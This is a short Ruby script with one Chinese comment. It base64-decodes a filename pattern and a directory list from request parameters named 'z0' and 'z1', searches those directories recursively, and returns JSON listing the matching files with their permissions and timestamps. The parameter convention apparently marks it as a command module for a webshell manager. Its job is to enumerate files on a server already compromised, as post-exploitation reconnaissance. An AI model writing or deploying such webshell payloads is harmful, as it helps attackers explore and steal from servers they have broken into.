require 'base64'
require 'json'
require 'find'
require 'etc'

def to_regex(string)
  string = string.to_s.strip
  if string =~ %r{^([/#~]).*\1[a-imsuxADSUX]*$}
    delimiter = $1
    modifiers_str = string.split(delimiter).last
    pattern = string.sub(/^#{Regexp.escape(delimiter)}/, '').sub(/#{Regexp.escape(delimiter)}[a-imsuxADSUX]*$/, '')
    options = modifiers_str.include?('i') ? Regexp::IGNORECASE : 0
    return Regexp.new(pattern, options)
  end

  if string.include?('*') || string.include?('?')
    escaped = Regexp.escape(string)
    regex_pattern = escaped.gsub('\\\*', '.*').gsub('\\\?', '.')
    return Regexp.new("^#{regex_pattern}$", Regexp::IGNORECASE)
  end

  if string =~ /[\.\\\\\+\*\?\^\$\[\]\(\)\{\}<>=\!\|:\-]/
    begin
      return Regexp.new(string)
    rescue RegexpError
    end
  end

  Regexp.new(Regexp.escape(string), Regexp::IGNORECASE)
end

def fn_get_file_permission(file_path)
  stat = File.lstat(file_path)
  
  type = if stat.socket? then 's'
         elsif stat.symlink? then 'l'
         elsif stat.file? then 'r'
         elsif stat.blockdev? then 'b'
         elsif stat.directory? then 'd'
         elsif stat.chardev? then 'c'
         elsif stat.pipe? then 'p'
         else 'u'
         end

  mode = stat.mode

  rwx = [
    (mode & 0o400 != 0 ? 'r' : '-'), (mode & 0o200 != 0 ? 'w' : '-'), '', # Owner
    (mode & 0o040  != 0 ? 'r' : '-'), (mode & 0o020  != 0 ? 'w' : '-'), '', # Group
    (mode & 0o004  != 0 ? 'r' : '-'), (mode & 0o002  != 0 ? 'w' : '-'), ''  # World
  ]

  # Owner
  if mode & 0o4000 != 0
    rwx[2] = (mode & 0o100 != 0 ? 's' : 'S')
  else
    rwx[2] = (mode & 0o100 != 0 ? 'x' : '-')
  end

  # Group
  if mode & 0o2000 != 0
    rwx[5] = (mode & 0o010 != 0 ? 's' : 'S')
  else
    rwx[5] = (mode & 0o010 != 0 ? 'x' : '-')
  end

  # World
  if mode & 0o1000 != 0
    rwx[8] = (mode & 0o001 != 0 ? 't' : 'T')
  else
    rwx[8] = (mode & 0o001 != 0 ? 'x' : '-')
  end

  type + rwx.join
rescue
  "u---------"
end

def fn_datetime_conversion(time_obj)
  time_obj.strftime("%Y-%m-%d %H:%M:%S")
end

def main
  regex_obj = to_regex(Base64.decode64($_POST['z0'].to_s))
  dirs_str  = Base64.decode64($_POST['z1'].to_s)

  dirs = dirs_str.split(',')
  target_dirs = []

  dirs.each do |dir|
    dir_trimmed = dir.strip
    target_dirs << dir_trimmed if Dir.exist?(dir_trimmed)
  end

  if target_dirs.empty?
    print JSON.generate({
      'status' => false,
      'msg' => 'Cannot find any valid directory'
    })
    return
  end

  results = []

  target_dirs.each do |target_dir|
    begin
      Find.find(target_dir) do |path|
        next if path == target_dir

        filename = File.basename(path)
        
        if filename =~ regex_obj
          begin
            stat = File.lstat(path)
            real_path = File.expand_path(path)

            results << {
              'name'          => filename,
              'path'          => real_path,
              'type'          => stat.directory? ? 'Directory' : 'File',
              'permission'    => fn_get_file_permission(path),
              'created'       => fn_datetime_conversion(stat.ctime), # 在 Linux 通常是 狀態改變時間
              'last_modified' => fn_datetime_conversion(stat.mtime),
              'last_accessed' => fn_datetime_conversion(stat.atime)
            }
          rescue => _e
            next
          end
        end
      end
    rescue => e
      print JSON.generate({
        'status' => false,
        'msg' => e.message
      })
      return
    end
  end

  print JSON.generate({
    'status' => true,
    'results' => results
  })
end

main